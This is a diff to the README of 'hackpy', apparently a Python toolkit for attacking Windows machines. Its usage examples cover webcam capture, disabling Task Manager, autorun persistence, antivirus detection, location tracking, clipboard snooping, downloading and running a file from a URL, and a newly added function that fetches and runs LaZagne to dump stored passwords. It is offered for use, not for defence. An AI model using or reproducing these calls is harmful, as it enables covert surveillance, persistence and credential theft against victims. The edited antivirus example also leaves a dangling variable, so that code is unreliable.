@@ -3,11 +3,20 @@
 
 # Example usage:
 ``` python
+# Warning! This module working only on Windows systems!
 # Import modules
 import os
 import hackpy
 ```
 
+# Get user information
+``` python
+print(
+	'\nWelcome to HackPy!' +
+	'\nUsername: ' + hackpy.username +
+	'\nComputername: ' + hackpy.computername
+	)
+```
 
 # Webcam screenshot
 ``` python
@@ -25,10 +34,12 @@ if hackpy.taskmanager.find('iexplore.exe') == True:
     
 # Return dictonary with all processes
 for process in hackpy.taskmanager.list(): 
-    print( process )
+    print(process)
 
-hackpy.taskmanager.disable() # Disable windows taskmgr.exe
-hackpy.taskmanager.enable()  # Enable windows taskmgr.exe
+# Disable windows taskmgr.exe
+hackpy.taskmanager.disable()
+# Enable windows taskmgr.exe
+hackpy.taskmanager.enable() 
 ```
 
 # Autorun
@@ -41,9 +52,8 @@ hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False)
 ```
 
 # Detect installed antivirus software on computer:
-``` python
-data = hackpy.detect_protection()
-for antivirus in data:
+``` python 
+for antivirus in hackpy.detect_protection():
     print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
 ```
 
@@ -67,23 +77,29 @@ print('[?] - Latitude: ' + data['geoplugin_latitude'])
 
 # Get router bssid:
 ``` python
-bssid_string = hackpy.router() # BETA
+# Get router BSSID
+bssid_string = hackpy.router()
 # Find LATITUDE and LONGITUDE with router BSSID:
 data = hackpy.bssid_locate(bssid_string)
-print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))
+print(
+    'RANGE     : ' + str(data['range']) + '\n' +
+    'LATITUDE  : ' + str(data['lat'])   + '\n' +
+    'LONGITUDE : ' + str(data['lon'])   + '\n'
+    )
 ```
 
 # Windows messagebox:
 ``` python
-hackpy.messagebox('error', 'LOL', 'System has been killed :D') # none, info, error, warning, question types
+# MessageBox types: none, info, question, warning, error 
+hackpy.messagebox('error', 'LOL', 'System has been killed :D')
 ```
 
 # Nircmdc commands
+![SITE](https://i.ibb.co/znRLN0D/image.png)
 ``` python
 # You can run nircmdc commands in python
 hackpy.command.nircmdc('monitor off')
 hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
-
 # Nircmdc reference: https://nircmd.nirsoft.net
 ```
 
@@ -103,26 +119,31 @@ hackpy.sendkey('Hello bro{ENTER}')
 # Get text from clipboard:
 data = hackpy.clipboard.get()
 print('Text in clipboard is ' + data)
-
 # Set text to clipboard:
 hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
 ```
 
 # Download python and install it:
 ``` python
-if hackpy.check_python() == False: # Check if python installed on system. False - not installed, True - installed.
+# Check if python installed on system. False - not installed, True - installed.
+if hackpy.check_python() == False: 
     print('Python is not installed, trying to install!')
-    hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37
+    # Default version is 3.7.0 and install path is C:\python37
+    hackpy.install_python('3.6.0', path = 'C:\\python36') 
 else:
     print('Python is installed!')
 ```
 
 # Load and execute file from internet
 ``` python
+# Download file
 file = hackpy.wget(url)
+# Start file
 os.startfile(file)
 ```
 
-### Nircmdc reference: *https://nircmd.nirsoft.net*
-
-![SITE](https://i.ibb.co/znRLN0D/image.png)
+# Passwords recovery
+``` python
+# This function just download LaZagne and execute it..
+passwords_recovery(filename = 'passwords.txt')
+```
